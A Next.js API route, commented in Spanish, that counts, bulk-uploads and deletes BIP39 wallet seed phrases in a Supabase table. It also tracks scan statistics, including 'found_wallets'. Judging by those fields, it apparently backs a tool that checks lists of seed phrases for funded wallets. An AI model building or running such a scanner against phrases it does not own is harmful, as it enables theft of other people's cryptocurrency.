import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as bip39 from 'bip39';

export async function GET() {
  try {
    const { count, error } = await supabaseAdmin
      .from('mnemonic_seeds')
      .select('*', { count: 'exact', head: true });

    if (error) throw error;
    return NextResponse.json({ count: count || 0 });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : 'Error reading seeds';
    return NextResponse.json({ error: message }, { status: 500 });
  }
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const rawText: string = body.text || '';
    const phrasesArray: string[] = body.phrases || [];

    let phrases: string[] = [];

    if (rawText) {
      phrases = rawText.split('\n').map(p => p.trim()).filter(Boolean);
    } else if (phrasesArray.length > 0) {
      phrases = phrasesArray.map(p => p.trim()).filter(Boolean);
    }

    // Validar mnemónicos BIP39
    const validPhrases = [...new Set(phrases.filter(p => bip39.validateMnemonic(p)))];

    if (validPhrases.length === 0) {
      return NextResponse.json({ error: 'No se encontraron frases mnemónicas BIP39 válidas.' }, { status: 400 });
    }

    // Insertar en lotes de 500 en Supabase
    const batchSize = 500;
    let insertedCount = 0;

    for (let i = 0; i < validPhrases.length; i += batchSize) {
      const batch = validPhrases.slice(i, i + batchSize).map(phrase => ({ phrase }));
      const { error } = await supabaseAdmin.from('mnemonic_seeds').upsert(batch, { onConflict: 'phrase' });
      if (!error) {
        insertedCount += batch.length;
      }
    }

    // Actualizar total_phrases en scan_stats
    const { count } = await supabaseAdmin.from('mnemonic_seeds').select('*', { count: 'exact', head: true });
    await supabaseAdmin.from('scan_stats').upsert({
      id: 'main',
      total_phrases: count || insertedCount,
      updated_at: new Date().toISOString()
    });

    return NextResponse.json({
      success: true,
      added: insertedCount,
      total: count || insertedCount
    });

  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : 'Error uploading seeds';
    return NextResponse.json({ error: message }, { status: 500 });
  }
}

export async function DELETE() {
  try {
    await supabaseAdmin.from('mnemonic_seeds').delete().neq('id', 0);
    await supabaseAdmin.from('scan_stats').upsert({
      id: 'main',
      total_phrases: 0,
      processed: 0,
      found_wallets: 0,
      updated_at: new Date().toISOString()
    });
    return NextResponse.json({ success: true });
  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : 'Error clearing seeds';
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
